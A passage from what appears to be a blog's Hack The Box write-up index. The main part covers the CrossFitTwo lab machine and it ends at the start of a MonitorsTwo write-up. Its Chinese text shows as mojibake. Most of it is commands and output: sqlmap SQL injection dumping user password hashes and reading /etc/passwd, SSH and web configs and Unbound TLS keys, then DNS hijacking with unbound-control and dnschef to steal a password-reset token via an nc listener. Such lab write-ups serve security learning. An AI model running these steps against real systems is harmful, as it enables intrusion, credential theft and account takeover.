employees      |\n| password_reset |\n+----------------+\n```\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 -D employees -T employees --dump\n\nDatabase: employees\nTable: employees\n[4 entries]\n+----+-----------------------------+------------------------------------------------------------------+---------------+\n| id | email                       | password                                                         | username      |\n+----+-----------------------------+------------------------------------------------------------------+---------------+\n| 1  | david.palmer@crossfit.htb   | fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 | administrator |\n| 2  | will.smith@crossfit.htb     | 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 | wsmith        |\n| 3  | maria.williams@crossfit.htb | fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c | mwilliams     |\n| 4  | jack.parker@crossfit.htb    | 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 | jparker       |\n+----+-----------------------------+------------------------------------------------------------------+---------------+\n```\næµ‹è¯•äº†ä¸€ä¸‹ï¼Œæ— æ³•è§£å¯†å‡ºæ¥ï¼Œè®©æˆ‘ä»¬æ¢ä¸ªæ€è·¯\n\nè®©æˆ‘ä»¬ä½¿ç”¨sqlæ³¨å…¥è¯»å–ä¸€ä¸‹æ–‡ä»¶è¯•è¯• > OpenBSDç›¸å…³é…ç½®æ–‡ä»¶\n\n> https://man.openbsd.org/?query=config&apropos=1&sec=5&arch=default&manpath=OpenBSD-current\n\n### /etc/passwd\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=\"/etc/passwd\"\n\nroot:*:0:0:Charlie &:/root:/bin/ksh\ndaemon:*:1:1:The devil himself:/root:/sbin/nologin\noperator:*:2:5:System &:/operator:/sbin/nologin\nbin:*:3:7:Binaries Commands and Source:/:/sbin/nologin\nbuild:*:21:21:base and xenocara build:/var/empty:/bin/ksh\nsshd:*:27:27:sshd privsep:/var/empty:/sbin/nologin\n_portmap:*:28:28:portmap:/var/empty:/sbin/nologin\n_identd:*:29:29:identd:/var/empty:/sbin/nologin\n_rstatd:*:30:30:rpc.rstatd:/var/empty:/sbin/nologin\n_rusersd:*:32:32:rpc.rusersd:/var/empty:/sbin/nologin\n_fingerd:*:33:33:fingerd:/var/empty:/sbin/nologin\n_x11:*:35:35:X Server:/var/empty:/sbin/nologin\n_unwind:*:48:48:Unwind Daemon:/var/empty:/sbin/nologin\n_switchd:*:49:49:Switch Daemon:/var/empty:/sbin/nologin\n_traceroute:*:50:50:traceroute privdrop user:/var/empty:/sbin/nologin\n_ping:*:51:51:ping privdrop user:/var/empty:/sbin/nologin\n_unbound:*:53:53:Unbound Daemon:/var/unbound:/sbin/nologin\n_dpb:*:54:54:dpb privsep:/var/empty:/sbin/nologin\n_pbuild:*:55:55:dpb build user:/nonexistent:/sbin/nologin\n_pfetch:*:56:56:dpb fetch user:/nonexistent:/sbin/nologin\n_pkgfetch:*:57:57:pkg fetch user:/nonexistent:/sbin/nologin\n_pkguntar:*:58:58:pkg untar user:/nonexistent:/sbin/nologin\n_spamd:*:62:62:Spam Daemon:/var/empty:/sbin/nologin\nwww:*:67:67:HTTP Server:/var/www:/sbin/nologin\n_isakmpd:*:68:68:isakmpd privsep:/var/empty:/sbin/nologin\n_rpki-client:*:70:70:rpki-client user:/nonexistent:/sbin/nologin\n_syslogd:*:73:73:Syslog Daemon:/var/empty:/sbin/nologin\n_pflogd:*:74:74:pflogd privsep:/var/empty:/sbin/nologin\n_bgpd:*:75:75:BGP Daemon:/var/empty:/sbin/nologin\n_tcpdump:*:76:76:tcpdump privsep:/var/empty:/sbin/nologin\n_dhcp:*:77:77:DHCP programs:/var/empty:/sbin/nologin\n_mopd:*:78:78:MOP Daemon:/var/empty:/sbin/nologin\n_tftpd:*:79:79:TFTP Daemon:/var/empty:/sbin/nologin\n_rbootd:*:80:80:rbootd Daemon:/var/empty:/sbin/nologin\n_ppp:*:82:82:PPP utilities:/var/empty:/sbin/nologin\n_ntp:*:83:83:NTP Daemon:/var/empty:/sbin/nologin\n_ftp:*:84:84:FTP Daemon:/var/empty:/sbin/nologin\n_ospfd:*:85:85:OSPF Daemon:/var/empty:/sbin/nologin\n_hostapd:*:86:86:HostAP Daemon:/var/empty:/sbin/nologin\n_dvmrpd:*:87:87:DVMRP Daemon:/var/empty:/sbin/nologin\n_ripd:*:88:88:RIP Daemon:/var/empty:/sbin/nologin\n_relayd:*:89:89:Relay Daemon:/var/empty:/sbin/nologin\n_ospf6d:*:90:90:OSPF6 Daemon:/var/empty:/sbin/nologin\n_snmpd:*:91:91:SNMP Daemon:/var/empty:/sbin/nologin\n_ypldap:*:93:93:YP to LDAP Daemon:/var/empty:/sbin/nologin\n_rad:*:94:94:IPv6 Router Advertisement Daemon:/var/empty:/sbin/nologin\n_smtpd:*:95:95:SMTP Daemon:/var/empty:/sbin/nologin\n_rwalld:*:96:96:rpc.rwalld:/var/empty:/sbin/nologin\n_nsd:*:97:97:NSD Daemon:/var/empty:/sbin/nologin\n_ldpd:*:98:98:LDP Daemon:/var/empty:/sbin/nologin\n_sndio:*:99:99:sndio privsep:/var/empty:/sbin/nologin\n_ldapd:*:100:100:LDAP Daemon:/var/empty:/sbin/nologin\n_iked:*:101:101:IKEv2 Daemon:/var/empty:/sbin/nologin\n_iscsid:*:102:102:iSCSI Daemon:/var/empty:/sbin/nologin\n_smtpq:*:103:103:SMTP Daemon:/var/empty:/sbin/nologin\n_file:*:104:104:file privsep:/var/empty:/sbin/nologin\n_radiusd:*:105:105:RADIUS Daemon:/var/empty:/sbin/nologin\n_eigrpd:*:106:106:EIGRP Daemon:/var/empty:/sbin/nologin\n_vmd:*:107:107:VM Daemon:/var/empty:/sbin/nologin\n_tftp_proxy:*:108:108:tftp proxy daemon:/nonexistent:/sbin/nologin\n_ftp_proxy:*:109:109:ftp proxy daemon:/nonexistent:/sbin/nologin\n_sndiop:*:110:110:sndio privileged user:/var/empty:/sbin/nologin\n_syspatch:*:112:112:syspatch unprivileged user:/var/empty:/sbin/nologin\n_slaacd:*:115:115:SLAAC Daemon:/var/empty:/sbin/nologin\nnobody:*:32767:32767:Unprivileged user:/nonexistent:/sbin/nologin\n_mysql:*:502:502:MySQL Account:/nonexistent:/sbin/nologin\nlucille:*:1002:1002:,,,:/home/lucille:/bin/csh\nnode:*:1003:1003::/home/node:/bin/ksh\n_dbus:*:572:572:dbus user:/nonexistent:/sbin/nologin\n_redis:*:686:686:redis account:/var/redis:/sbin/nologin\ndavid:*:1004:1004:,,,:/home/david:/bin/csh\njohn:*:1005:1005::/home/john:/bin/csh\nftp:*:1006:1006:FTP:/home/ftp:/sbin/nologin\n```\n### /etc/login.conf\næ ¹æ®é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨æœ‰yubikeyï¼š\n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=\"/etc/login.conf\"\n\n# $OpenBSD: login.conf,v 1.16 2020/06/23 15:45:34 naddy Exp $\n\n#\n# Sample login.conf file.  See login.conf(5) for details.\n#\n\n#\n# Standard authentication styles:\n#\n# passwd        Use only the local password file\n# chpass        Do not authenticate, but change user's password (change\n#               the YP password if the user has one, else change the\n#               local password)\n# lchpass       Do not login; change user's local password instead\n# radius        Use radius authentication\n# reject        Use rejected authentication\n# skey          Use S/Key authentication\n# activ         ActivCard X9.9 token authentication\n# crypto        CRYPTOCard X9.9 token authentication\n# snk           Digital Pathways SecureNet Key authentication\n# tis           TIS Firewall Toolkit authentication\n# token         Generic X9.9 token authentication\n# yubikey       YubiKey authentication\n#\n\n# Default allowed authentication styles\nauth-defaults:auth=passwd,skey:\n\n# Default allowed authentication styles for authentication type ftp\nauth-ftp-defaults:auth-ftp=passwd:\n\n#\n# The default values\n# To alter the default authentication types change the line:\n#       :tc=auth-defaults:\\\n# to read something like: (enables passwd, \"myauth\", and activ)\n#       :auth=passwd,myauth,activ:\\\n# Any value changed in the daemon class should be reset in default\n# class.\n#\ndefault:\\\n        :path=/usr/bin /bin /usr/sbin /sbin /usr/X11R6/bin /usr/local/bin /usr/local/sbin:\\\n        :umask=022:\\\n        :datasize-max=768M:\\\n        :datasize-cur=768M:\\\n        :maxproc-max=256:\\\n        :maxproc-cur=128:\\\n        :openfiles-max=102400:\\\n        :openfiles-cur=102400:\\\n        :stacksize-cur=4M:\\\n        :localcipher=blowfish,a:\\\n        :tc=auth-defaults:\\\n        :tc=auth-ftp-defaults:\n\n#\n# Settings used by /etc/rc and root\n# This must be set properly for daemons started as root by inetd as well.\n# Be sure to reset these values to system defaults in the default class!\n#\ndaemon:\\\n        :ignorenologin:\\\n        :datasize=infinity:\\\n        :maxproc=infinity:\\\n        :openfiles-max=102400:\\\n        :openfiles-cur=102400:\\\n        :stacksize-cur=8M:\\\n        :auth-ssh=yubikey:\\\n        :auth-su=reject:\\\n        :tc=default:\n\n#\n# Staff have fewer restrictions and can login even when nologins are set.\n#\nstaff:\\\n        :datasize-cur=1536M:\\\n        :datasize-max=infinity:\\\n        :maxproc-max=512:\\\n        :maxproc-cur=256:\\\n        :ignorenologin:\\\n        :requirehome@:\\\n        :tc=default:\n\n#\n# Authpf accounts get a special motd and shell\n#\nauthpf:\\\n        :welcome=/etc/motd.authpf:\\\n        :shell=/usr/sbin/authpf:\\\n        :tc=default:\n\n#\n# Building ports with DPB uses raised limits\n#\npbuild:\\\n        :datasize-max=infinity:\\\n        :datasize-cur=8192M:\\\n        :maxproc-max=1024:\\\n        :maxproc-cur=384:\\\n        :priority=5:\\\n        :tc=default:\n\n#\n# Override resource limits for certain daemons started by rc.d(8)\n#\nbgpd:\\\n        :openfiles=512:\\\n        :tc=daemon:\n\nunbound:\\\n        :openfiles=512:\\\n        :tc=daemon:\n\n```\n### /etc/ssh/sshd\\_config\nrootéœ€è¦å…¬é’¥å’Œå¯†ç ï¼Œérootéœ€è¦å¯†ç \n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=\"/etc/ssh/sshd_config\"\n\n#   $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $\n\n# This is the sshd server system-wide configuration file.  See\n# sshd_config(5) for more information.\n\n# The strategy used for options in the default sshd_config shipped with\n# OpenSSH is to specify options with their default value where\n# possible, but leave them commented.  Uncommented options override the\n# default value.\n\n#Port 22\n#AddressFamily any\n#ListenAddress 0.0.0.0\n#ListenAddress ::\n\n#HostKey /etc/ssh/ssh_host_rsa_key\n#HostKey /etc/ssh/ssh_host_ecdsa_key\n#HostKey /etc/ssh/ssh_host_ed25519_key\n\n# Ciphers and keying\n#RekeyLimit default none\n\n# Logging\n#SyslogFacility AUTH\n#LogLevel INFO\n\n# Authentication:\n\n#LoginGraceTime 2m\nPermitRootLogin yes\n#StrictModes yes\n#MaxAuthTries 6\n#MaxSessions 10\n\n#PubkeyAuthentication yes\n\n# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2\n# but this is overridden so installations will only check .ssh/authorized_keys\nAuthorizedKeysFile  .ssh/authorized_keys\n\n#AuthorizedPrincipalsFile none\n\n#AuthorizedKeysCommand none\n#AuthorizedKeysCommandUser nobody\n\n# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts\n#HostbasedAuthentication no\n# Change to yes if you don't trust ~/.ssh/known_hosts for\n# HostbasedAuthentication\n#IgnoreUserKnownHosts no\n# Don't read the user's ~/.rhosts and ~/.shosts files\n#IgnoreRhosts yes\n\n# To disable tunneled clear text passwords, change to no here!\n#PasswordAuthentication yes\n#PermitEmptyPasswords no\n\n# Change to no to disable s/key passwords\n#ChallengeResponseAuthentication yes\n\n#AllowAgentForwarding yes\n#AllowTcpForwarding yes\n#GatewayPorts no\n#X11Forwarding no\n#X11DisplayOffset 10\n#X11UseLocalhost yes\n#PermitTTY yes\n#PrintMotd yes\n#PrintLastLog yes\n#TCPKeepAlive yes\n#PermitUserEnvironment no\n#Compression delayed\n#ClientAliveInterval 0\n#ClientAliveCountMax 3\n#UseDNS no\n#PidFile /var/run/sshd.pid\n#MaxStartups 10:30:100\n#PermitTunnel no\n#ChrootDirectory none\n#VersionAddendum none\n\n# no default banner path\n#Banner none\n\n# override default of no subsystems\nSubsystem   sftp    /usr/libexec/sftp-server\n\n# Example of overriding settings on a per-user basis\n#Match User anoncvs\n#   X11Forwarding no\n#   AllowTcpForwarding no\n#   PermitTTY no\n#   ForceCommand cvs server\n\nMatch User root\n    AuthenticationMethods publickey,password\nMatch User *,!root\n    AuthenticationMethods password\n```\n### /etc/httpd.conf\næ ¹æ®é…ç½®æ–‡ä»¶ï¼Œé™¤äº†chatå’Œemployeesè¿˜æœ‰å…¶ä»–çš„ï¼š\n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=\"/etc/httpd.conf\"\n\n# $OpenBSD: httpd.conf,v 1.20 2018/06/13 15:08:24 reyk Exp $\n\ntypes {\n    include \"/usr/share/misc/mime.types\"\n}\n\nserver \"0.0.0.0\" {\n        no log\n        listen on lo0 port 8000\n\n        root \"/htdocs\"\n        directory index index.php\n\n        location \"*.php*\" {\n                fastcgi socket \"/run/php-fpm.sock\"\n        }\n}\n\nserver \"employees\" {\n        no log\n        listen on lo0 port 8001\n\n        root \"/htdocs_employees\"\n        directory index index.php\n\n        location \"*.php*\" {\n                fastcgi socket \"/run/php-fpm.sock\"\n        }\n}\n\nserver \"chat\" {\n        no log\n        listen on lo0 port 8002\n\n        root \"/htdocs_chat\"\n        directory index index.html\n\n        location match \"^/home$\" {\n            request rewrite \"/index.html\"\n        }\n        location match \"^/login$\" {\n            request rewrite \"/index.html\"\n        }\n        location match \"^/chat$\" {\n            request rewrite \"/index.html\"\n        }\n        location match \"^/favicon.ico$\" {\n            request rewrite \"/images/cross.png\"\n        }\n}\n```\n### /etc/relayd.conf\nå¾—åˆ°crossfit-club.htbï¼ŒåŠ hostsï¼š\n\n```Plain Text\necho 10.10.10.232 crossfit-club.htb >> /etc/hosts\n```\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1  --batch --technique=B --threads=10 --file-read=\"/etc/relayd.conf\"\n\ntable<1>{127.0.0.1}\ntable<2>{127.0.0.1}\ntable<3>{127.0.0.1}\ntable<4>{127.0.0.1}\nhttp protocol web{\n        pass request quick header \"Host\" value \"*crossfit-club.htb\" forward to <3>\n        pass request quick header \"Host\" value \"*employees.crossfit.htb\" forward to <2>\n        match request path \"/*\" forward to <1>\n        match request path \"/ws*\" forward to <4>\n        http websockets\n}\n\ntable<5>{127.0.0.1}\ntable<6>{127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4}\nhttp protocol portal{\n        pass request quick path \"/\" forward to <5>\n        pass request quick path \"/index.html\" forward to <5>\n        pass request quick path \"/home\" forward to <5>\n        pass request quick path \"/login\" forward to <5>\n        pass request quick path \"/chat\" forward to <5>\n        pass request quick path \"/js/*\" forward to <5>\n        pass request quick path \"/css/*\" forward to <5>\n        pass request quick path \"/fonts/*\" forward to <5>\n        pass request quick path \"/images/*\" forward to <5>\n        pass request quick path \"/favicon.ico\" forward to <5>\n        pass forward to <6>\n        http websockets\n}\n\nrelay web{\n        listen on \"0.0.0.0\" port 80\n        protocol web\n        forward to <1> port 8000\n        forward to <2> port 8001\n        forward to <3> port 9999\n        forward to <4> port 4419\n}\n\nrelay portal{\n        listen on 127.0.0.1 port 9999\n        protocol portal\n        forward to <5> port 8002\n        forward to <6> port 5000 mode source-hash\n}\n```\nåæ§½ä¸€ä¸‹ï¼Œæ³¨å…¥è¯»æ–‡ä»¶æ˜¯çœŸçš„æ…¢ï¼Œæ…¢çš„æœ‰ç‚¹ç¦»è°±äº†\n\nå’±ä»¬è®¿é—®ä¸€ä¸‹æ–°å‘ç°çš„é¡µé¢\n\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/f555eb60-57c6-4c73-a52f-f701dd0d0a24.png)\n\nä¼¼ä¹åˆæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œä½†å’±ä»¬ä¾ç„¶æ²¡æœ‰è´¦å·å¯†ç \n\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/d89604a2-83ee-4646-bd88-60d2f70484bd.png)\n\næœ¬æƒ³æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œå´å‘ç°è¢«ç¦æ­¢æ³¨å†Œäº†\n\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/0e480630-e41c-4857-833d-3f3d55df399c.png)\n\nåœ¨æµé‡å†…å‘ç°è¯·æ±‚äº†\n\n```Plain Text\n/api/auth\n```\nï¼Œå’±ä»¬fuzzä¸€ä¸‹å…¶ä»–apiçœ‹çœ‹\n\n```Plain Text\ngobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -u http://crossfit-club.htb/api/\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -u http://crossfit-club.htb/api/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://crossfit-club.htb/api/\n[+] Method:                  GET\n[+] Threads:                 20\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/api/objects.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              json\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/08/02 19:14:30 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://crossfit-club.htb/api/auth                 (Status: 200) [Size: 66]\nhttp://crossfit-club.htb/api/ping                 (Status: 200) [Size: 71]\n\n===============================================================\n2021/08/02 19:15:51 Finished\n===============================================================\n```\n```Plain Text\ngobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -m POST -u http://crossfit-club.htb/api/\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -e -t 20 -x json -m POST -u http://crossfit-club.htb/api/\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://crossfit-club.htb/api/\n[+] Method:                  POST\n[+] Threads:                 20\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/api/objects.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              json\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\n2021/08/02 19:22:33 Starting gobuster in directory enumeration mode\n===============================================================\nhttp://crossfit-club.htb/api/Login                (Status: 200) [Size: 50]\nhttp://crossfit-club.htb/api/login                (Status: 200) [Size: 50]\nhttp://crossfit-club.htb/api/signup               (Status: 200) [Size: 50]\n\n===============================================================\n2021/08/02 19:23:53 Finished\n===============================================================\n```\nåœ¨apiä¸­å‘ç°äº†signupï¼Œå’±ä»¬è®¿é—®ä¸€ä¸‹çœ‹çœ‹\n\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/0b0c69c0-5a0b-4766-8716-e614f77eca9a.png)\n\nè®¿é—®åæç¤ºæ— æ³•GETè·å–\n\n```Plain Text\n/api/signup\n```\nï¼Œå’±ä»¬ä½¿ç”¨burpæŠ“åŒ…è¯•è¯•\n\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/76bc805d-1333-4471-91a0-52e51d6de72f.png)\n\nè¿™è¾¹æç¤ºå’±ä»¬CSRF Tokenä¸å¯¹\n\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/e04e85f7-e800-41d5-b37c-ec7f2a06736f.png)\n\nç¨å¾®ä¿®æ”¹åï¼Œæç¤ºåªæœ‰ç®¡ç†å‘˜å¯ä»¥æ³¨å†Œç”¨æˆ·\n\n```Plain Text\nPOST /api/signup HTTP/1.1\nHost: crossfit-club.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: connect.sid=s%3Ae44z5Xt6fe5g1VLuMNHs-ZD7sFPh8C4k.NEClY9BvwLeMaL3zZCfxvxxFZfHp6iak0Xa8QLTO1pw\nUpgrade-Insecure-Requests: 1\nContent-Length: 113\nX-CSRF-Token: xmiei8Ex-OKmxFdQOUaVH_4aoIjuUT-dz6HQ\n\n{\n    \"username\":\"lucifiel\",\n    \"password\":\"lucifiel123\",\n    \"email\":\"lucifiel@crossfit.htb\",\n    \"confirm\":\"lucifiel123\"\n}\n```\nå’±ä»¬æŠŠç›®å…‰æ”¾åœ¨8953ç«¯å£ä¸Šï¼Œè¿™ä¸ªæ˜¯`Unbound`çš„`control-part`ç«¯å£ï¼Œå’±ä»¬é€šè¿‡sqlå»è¯»å– > https://man.openbsd.org/unbound.conf\n\n### /var/unbound/etc/unbound.conf\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/unbound.conf\"\n\nserver:\n        interface: 127.0.0.1\n        interface: ::1\n        access-control: 0.0.0.0/0 refuse\n        access-control: 127.0.0.0/8 allow\n        access-control: ::0/0 refuse\n        access-control: ::1 allow\n        hide-identity: yes\n        hide-version: yes\n        msg-cache-size: 0\n        rrset-cache-size: 0\n        cache-max-ttl: 0\n        cache-max-negative-ttl: 0\n        auto-trust-anchor-file: \"/var/unbound/db/root.key\"\n        val-log-level: 2\n        aggressive-nsec: yes\n        include: \"/var/unbound/etc/conf.d/local_zones.conf\"\n\nremote-control:\n        control-enable: yes\n        control-interface: 0.0.0.0\n        control-use-cert: yes\n        server-key-file: \"/var/unbound/etc/tls/unbound_server.key\"\n        server-cert-file: \"/var/unbound/etc/tls/unbound_server.pem\"\n        control-key-file: \"/var/unbound/etc/tls/unbound_control.key\"\n        control-cert-file: \"/var/unbound/etc/tls/unbound_control.pem\"\n```\nå’±ä»¬éœ€è¦ä¸‹è½½ä¸‹é¢è¿™äº›æ–‡ä»¶\n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/tls/unbound_server.pem\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/tls/unbound_control.key\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/tls/unbound_control.pem\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/tls/unbound_server.key\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/etc/httpd.conf\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/etc/passwd\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/var/unbound/etc/unbound.conf\"\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10  --file-read=\"/etc/relayd.conf\"\n```\nä¿®æ”¹`crossfit.conf`æ–‡ä»¶å†…å®¹\n\n```Plain Text\nremote-control:\n    control-enable: yes\n    control-use-cert: \"yes\"\n    server-cert-file: \"/etc/unbound/unbound_server.pem\"\n    control-key-file: \"/etc/unbound/unbound_control.key\"\n    control-cert-file: \"/etc/unbound/unbound_control.pem\"\n```\nå°†æ‰€æœ‰è¯ä¹¦æ–‡ä»¶éƒ½æ”¾åˆ°`/etc/unbound/`ç›®å½•ä¸‹\n\nç„¶åæ£€æŸ¥ä¸€ä¸‹çŠ¶æ€\n\n```Plain Text\nunbound-control -c crossfit.conf -s 10.10.10.232 status\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# unbound-control -c crossfit.conf -s 10.10.10.232 status\nversion: 1.11.0\nverbosity: 1\nthreads: 1\nmodules: 2 [ validator iterator ]\nuptime: 44 seconds\noptions: control(ssl)\nunbound (pid 55403) is running...\n```\nä»`relayd`é…ç½®æ–‡ä»¶ä¸­ï¼ŒçŸ¥é“äº†æˆ‘ä»¬å¯ä»¥é…ç½®çš„æ˜¯`*employees.crossfit.htb`ï¼Œç°åœ¨æˆ‘ä»¬æ“ä½œèµ·æ¥\n\næˆ‘ä»¬åœ¨å‰é¢æ·»åŠ å…¶ä»–å­—ç¬¦ï¼Œå¹¶ä¸”æ§åˆ¶å¯¹åº”dnsï¼Œä»¥è¾¾åˆ°å¯†ç åŠ«æŒå……å€¼é“¾æ¥çš„ç›®çš„\n\nå°†dnsè¯·æ±‚è½¬å‘åˆ°æˆ‘ä»¬çš„dnsæœåŠ¡å™¨\n\n```Plain Text\nunbound-control -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.27@53\n```\nå°†`xemployees.crossfit.htb`æ·»åŠ åˆ°`/etc/hosts`\n\n```Plain Text\necho 10.10.10.232 xemployees.crossfit.htb >> /etc/hosts\n```\nä½¿ç”¨dnschefè¿›è¡ŒåŠ«æŒ > https://github.com/LucifielHack/dnschef\n\næœ¬åœ°ä½¿ç”¨ncç›‘å¬80ç«¯å£\n\n```Plain Text\nnc -nvlp 80\n```\nç„¶åunboundæ·»åŠ ä¸€æ¡è§„åˆ™ï¼Œå°†dnsè¯·æ±‚è½¬å‘åˆ°æˆ‘ä»¬çš„dnsæœåŠ¡å™¨\n\n```Plain Text\nunbound-control -c crossfit.conf -s 10.10.10.232 forward_add +i xemployees.crossfit.htb 10.10.14.2\n```\nä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥è·å¾—é‡ç½®é“¾æ¥\n\n```Plain Text\nsudo python3 dnschef.py -i 10.10.14.2 --fakedomains xemployees.crossfit.htb --fakeip 127.0.0.1\nsudo python3 dnschef.py -i 10.10.14.2 --fakedomains xemployees.crossfit.htb --fakeip 10.10.14.2\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nc -nvlp 80\nlistening on [any] 80 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.10.232] 1352\nGET /password-reset.php?token=ffe51814f0831927a5bff7ad15a09cdac20d68afe0d4945f4b32ead391d6ceeb03a9e25a07299c49947776cfd9f2ab6422260817233b1818ae8b86ca273de465 HTTP/1.1\nHost: xemployees.crossfit.htb\nUser-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nReferer: http://crossfit-club.htb/\nUpgrade-Insecure-Requests: 1\n```\næˆåŠŸè¿”å›tokenå€¼","tags":["Hackthebox"]},{"title":"MonitorsTwo - Hackthebox","url":"/2023/05/07/Hackthebox/Easy/Hackthebox-MonitorsTwo/","content":"\n# Hackthebox - MonitorsTwo\n# é¶åœºä¿¡æ¯\n![](Hackthebox-MonitorsTwo/i7buleFIoWpTCOSd5rZGbdlBp5jky3diopVTlFUmg_s.png)\n\n# é¶åœºéš¾åº¦\n![](Hackthebox-MonitorsTwo/WkIqj62gi9do_ov2iu2d1pk4ip3nteUupy7AK53AXN0.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.211\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 07:05 CST\nNmap scan report for 10.10.11.211\nHost is up (0.15s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)\n|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)\n|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Login to Cacti\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP 